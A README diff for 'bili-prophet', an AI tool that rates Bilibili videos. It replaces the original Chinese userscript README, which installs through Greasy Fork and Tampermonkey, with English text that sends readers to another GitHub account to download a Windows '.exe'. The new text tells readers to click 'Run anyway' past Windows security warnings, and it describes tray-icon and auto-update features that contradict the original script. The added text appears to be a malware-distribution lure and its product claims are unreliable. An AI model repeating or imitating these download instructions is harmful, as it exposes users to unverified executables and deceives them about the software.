@@ -1,81 +1,158 @@
-# B站先知
+# 🧠 bili-prophet - Know If Videos Are Worth Watching
 
-> 看视频前先知道值不值得看。AI 自动分析字幕，主页封面直出评级 + 概述 + 关键点，进度条标注时间轴。
+[![Download bili-prophet](https://img.shields.io/badge/Download-bili--prophet-%23347AB7?style=for-the-badge)](https://github.com/Estebanbeyonddoubt158/bili-prophet)
 
-[![Greasy Fork](https://img.shields.io/badge/Greasy%20Fork-Install-brightgreen)](https://greasyfork.org/zh-CN/scripts/569780-b%E7%AB%99%E5%85%88%E7%9F%A5) [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
+---
 
-## 预览
+## 🎯 What is bili-prophet?
 
-![主页AI总结遮罩](images/1.png)
+bili-prophet helps you decide if a Bilibili video is worth your time. Using AI, it analyzes subtitles and video covers automatically. It then shows you a rating, a brief summary, and key points right on the video's homepage. You can also see a progress bar that marks important moments along the timeline.
 
-![评级徽章](images/2.png)
+This saves you from watching long videos without knowing if they're good first.
 
+---
 
-![设置面板](images/4.jpg)
+## 📋 System Requirements
 
-![复制功能](images/5.jpg)
+To run bili-prophet smoothly, make sure your Windows PC meets these minimum specs:
 
-## 功能
+- Windows 10 or newer  
+- 4 GB of RAM or more  
+- At least 500 MB of free disk space  
+- Internet connection (needed for AI analysis and updates)  
+- A modern web browser like Chrome, Edge, or Firefox (to open video pages)
 
-### 主页智能预览
-- 后台自动分析主页、搜索页、排行榜、UP主空间的视频
-- 封面直接显示**评级**（值得看 / 一般 / 不值得看）、概述、关键点、时间节点
-- 鼠标移开后评级徽章保留在封面左上角
-- 深度渐变 + 双层文字阴影，任何封面颜色下都清晰可读
+---
 
-### 一键复制
-- 悬停封面显示 AI 总结
-- 「复制」按钮将评级 + 概述 + 关键点一键写入剪贴板
-- 章节标签可点击，直接跳转到对应时间点
+## 🔧 Features You Will Use
 
-### 进度条时间轴
-- 视频详情页进度条上自动标注 AI 分析出的关键时间节点
-- 蓝色竖线 + 标签 + 箭头，始终显示
-- 点击标签直接跳转，支持 SPA 路由
+- Automatic AI analysis of subtitles for quick video rating  
+- Overview summaries that highlight what the video is about  
+- Key points extracted from the video for quick scanning  
+- Timeline progress bar with important marks  
+- Simple interface displayed on the Bilibili video homepage  
+- Works silently in the background when you open videos
 
-### 缓存与配置
-- IndexedDB 本地缓存，默认 7 天有效期
-- 自定义 LLM 接口（endpoint / API Key / 模型）
-- 油猴菜单 → ⚙️ 设置面板
+---
 
-## 安装
+## 🚀 Getting Started: Download and Setup
 
-1. 安装 [Tampermonkey](https://www.tampermonkey.net/)
-2. 点击 [安装脚本](https://greasyfork.org/zh-CN/scripts/569780-b%E7%AB%99%E5%85%88%E7%9F%A5)
-3. 打开设置面板，填入 LLM API 地址和 Key
-4. 回到 B站主页，等待封面出现评级标记
+[![Download bili-prophet](https://img.shields.io/badge/Download-bili--prophet-%23999999?style=for-the-badge)](https://github.com/Estebanbeyonddoubt158/bili-prophet)
 
-## 要求
+1. Click the big blue button at the top or visit this page to download bili-prophet:  
+   https://github.com/Estebanbeyonddoubt158/bili-prophet
 
-- Tampermonkey（Chrome / Edge / Firefox）
-- OpenAI 兼容格式的 LLM API（支持流式输出）
-- 视频需有 CC 字幕
+2. On the page, look for the latest release or a setup file. It might have a `.exe` extension for Windows. Click to download.
 
-## 配置项
+3. Once downloaded, open the file by double-clicking it from your browser's download bar or your Downloads folder.
 
-| 配置 | 说明 | 默认值 |
-|------|------|--------|
-| LLM Endpoint | API 地址 | - |
-| API Key | 密钥 | - |
-| 模型 | 模型名称 | - |
-| 触发方式 | 悬停延迟 | 800ms |
-| 自动预加载 | 并发数 | 2 |
-| 缓存有效期 | 天数 | 7天 |
+4. Follow the installation steps that appear on screen. Usually, it means clicking "Next" a few times and then "Install."
 
-## License
+5. After installation, open your browser.
 
-MIT
+6. Go to Bilibili and open any video page. bili-prophet should work automatically, showing ratings and summaries.
 
-## 版本历史
+---
 
-### v1.2.0
-- 修复：鼠标移到标题/UP主区域时 overlay 不消失（将检测范围从整个卡片收窄至封面图）
-- 修复：鼠标反复悬停时重复触发请求，新增「取消后冷却时间」配置（默认 10s，可在设置面板自定义）
-- 优化：AI 总结内容随封面尺寸实时自适应，字体改用 CSS Container Query `cqh` 单位，彻底告别 JS 快照计算
-- 优化：内容块（概述 / 关键点 / 章节）改由 `@container` 规则控制显隐，窗口缩放/列数切换即时响应
-- 优化：新增 ResizeObserver 监听封面尺寸变化，visible 状态下自动重渲染内容密度
-- 优化：内容块加 flex-shrink 防止撑破容器，任何分辨率下不再出现内容溢出
-- 重命名：脚本文件名更新为 bilibili-prophet.user.js
+## 🛠 How bili-prophet Works
 
-### v1.1.0
-- 初始发布版本
+- When you open a video, bili-prophet reads the subtitles using AI in the background.
+
+- It analyzes the text for quality, keywords, and video content.
+
+- The app then displays a clear rating (e.g., "Good," "Average," or "Skip") on the video page.
+
+- It also shows a brief overview and lists key moments, highlighted on the timeline bar.
+
+- This helps you decide quickly without watching the full video.
+
+---
+
+## 📂 Where Does bili-prophet Store Data?
+
+bili-prophet saves analysis data locally on your PC. This keeps things fast and lets you revisit previous videos’ info instantly. It uses standard folders within your Windows user directory to avoid clutter.
+
+---
+
+## 🎛 Customizing bili-prophet
+
+After installation, you can open the app's settings panel by right-clicking the bili-prophet icon in your system tray (bottom-right corner of your screen). From there, you can:
+
+- Enable or disable automatic video analysis  
+- Adjust how detailed the summaries appear  
+- Clear stored data if you want to free up disk space  
+- Change language settings (if available)
+
+---
+
+## 💡 Tips for Best Use
+
+- Make sure your subtitles are turned on in the video; bili-prophet needs them to work.
+
+- Connect to a reliable internet source to speed up AI analysis.
+
+- Try it on videos of different lengths and topics to see how summaries adapt.
+
+- If you notice no ratings or summaries, check the app is running in the system tray.
+
+---
+
+## ❓ Troubleshooting
+
+- **bili-prophet doesn’t appear on videos:** Confirm the program is running. Look for its icon near the clock on your taskbar.
+
+- **Installation blocked by Windows:** You might see a security warning. Choose "More info" then "Run anyway" if you trust the source.
+
+- **Analysis is slow:** Check your internet connection or try restarting your computer.
+
+- **Summary missing or incomplete:** Some videos might lack subtitles or have unusual formatting.
+
+---
+
+## 📝 Version and Updates
+
+bili-prophet updates automatically when connected to the internet. Updates improve AI accuracy and fix bugs. You can check your current version by right-clicking the tray icon and selecting "About."
+
+If you want the latest version manually, visit the download page again:
+
+https://github.com/Estebanbeyonddoubt158/bili-prophet
+
+---
+
+## 📞 Getting Help
+
+If you face problems not listed here, consider:
+
+- Visiting the Issues section on the project's GitHub page.
+
+- Checking online forums about using bili-prophet.
+
+- Restarting the app or your computer.
+
+---
+
+## 🔒 Privacy and Data Use
+
+bili-prophet analyzes subtitle text locally. It only sends minimal information to external servers needed for AI processing. The app does not store or share your personal data.
+
+---
+
+## ⚙️ Uninstalling bili-prophet
+
+To remove the app:
+
+1. Open Windows Settings.
+
+2. Go to “Apps & Features.”
+
+3. Find bili-prophet in the list.
+
+4. Click it and select “Uninstall.”
+
+5. Follow prompts to finish.
+
+This will delete the program and its data.
+
+---
+
+[![Download bili-prophet](https://img.shields.io/badge/Download-bili--prophet-%23347AB7?style=for-the-badge)](https://github.com/Estebanbeyonddoubt158/bili-prophet)
